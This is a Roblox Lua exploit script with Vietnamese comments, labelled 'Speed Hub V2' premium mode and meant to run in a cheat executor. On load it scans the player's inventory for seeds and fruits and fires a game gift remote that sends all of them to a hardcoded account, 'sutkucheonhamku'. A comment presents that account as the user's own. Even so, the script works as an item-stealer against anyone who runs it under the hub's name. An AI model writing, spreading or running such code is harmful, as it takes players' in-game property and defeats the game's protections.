-- Chờ game tải xong hoàn toàn
repeat task.wait() until game:IsLoaded()

print("==== SPEED HUB V2: CHẾ ĐỘ PREMIUM ====")

if getgenv().HB_MailConfig then
    local config = getgenv().HB_MailConfig
    
    -- Cố định luôn tên người nhận là nick chính của bạn
    local targetPlayerName = "sutkucheonhamku" 

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer = Players.LocalPlayer

    -- Nơi nhận lệnh của game (Thay thế tên Remote chính xác bằng SimpleSpy)
    local Remotes = ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
    local SendGiftRemote = Remotes:FindFirstChild("SendGift") or Remotes:FindFirstChild("GiftEvent") or Remotes:FindFirstChild("SendMail")

    -- Hàm thực hiện gửi đồ trực tiếp bằng Tên chuỗi (String)
    local function sendItem(category, itemName, quantity)
        if SendGiftRemote then
            -- Không cần check trong phòng, gửi thẳng tên "sutkucheonhamku" lên Server game
            SendGiftRemote:FireServer(targetPlayerName, category, itemName, quantity)
            task.wait(0.5) -- Chờ một chút tránh bị kích hoạt hệ thống chống spam
        else
            warn("Chưa cấu hình đúng tên Remote gửi đồ của game!")
        end
    end

    -- =======================================================================
    -- QUÉT TÚI ĐỒ VÀ TIẾN HÀNH GỬI
    -- =======================================================================
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")

    if Inventory then
        -- 1. Gửi tất cả Hạt giống nếu bật SendAllSeeds hoặc SendSeeds
        if config.SendAllSeeds == true or config.SendSeeds == true then
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "seed") then
                    print("Đang gửi Hạt Giống ["..item.Name.."] tới nick chính: " .. targetPlayerName)
                    sendItem("Seeds", item.Name, item.Value)
                end
            end
        end

        -- 2. Gửi Trái cây nếu bật SendFruits
        if config.SendFruits == true then
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "fruit") then
                    print("Đang gửi Trái Cây ["..item.Name.."] tới nick chính: " .. targetPlayerName)
                    sendItem("Fruits", item.Name, item.Value)
                end
            end
        end
    else
        warn("Không tìm thấy túi đồ (Inventory) để quét!")
    end

else
    warn("Lỗi: Bạn chưa thiết lập HB_MailConfig trong Executor!")
end
